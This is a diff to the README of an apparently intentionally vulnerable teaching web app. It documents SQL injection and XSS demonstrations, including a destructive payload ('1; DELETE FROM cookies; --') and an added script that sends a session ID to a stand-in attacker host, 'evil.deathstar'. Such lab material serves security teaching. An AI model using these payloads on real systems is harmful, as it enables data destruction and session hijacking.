@@ -47,7 +47,7 @@ To demonstrate SQL injection vulnerabilities:
 
 2. **SQL Injection Example:**
 
-    - Enter a malicious input to exploit the SQL injection vulnerability.
+    - Enter a malicious input to exploit the SQL injection vulnerability that exists on the path `/update_stock`.
     - Make sure to edit the HTML form elements with `F12` to disable numeric input validation.
     - For example, to delete all cookies, enter `1; DELETE FROM cookies; --` for `cookie_id` and any value for `new_stock`.
     - This will execute the `DELETE FROM cookies` SQL command, removing all cookies from the database.
@@ -64,5 +64,26 @@ To demonstrate Cross-Site Scripting (XSS) vulnerabilities:
     - Enter a malicious script to exploit the XSS vulnerability.
     - For example, enter `<script>alert('XSS');</script>` as the comment.
     - This will execute the JavaScript code, showing an alert box with the message "XSS".
+
+3. **Leaking Session ID:**
+
+Enter a malicious script to leak the session ID.
+
+For example, enter:
+
+```js
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    fetch('http://evil.deathstar/leak?session_id=' + document.getElementById('session_id').value);
+});
+</script>
+```
+
+as the comment.
+
+This will send the session ID to the specified URL, demonstrating how XSS can be used to steal sensitive information.
+
+Look in the F12 console to see the session ID being exfiltrated via the Network tab.
+
 
 **Note:** This is for educational purposes only. Do not use SQL injection or XSS in real applications.
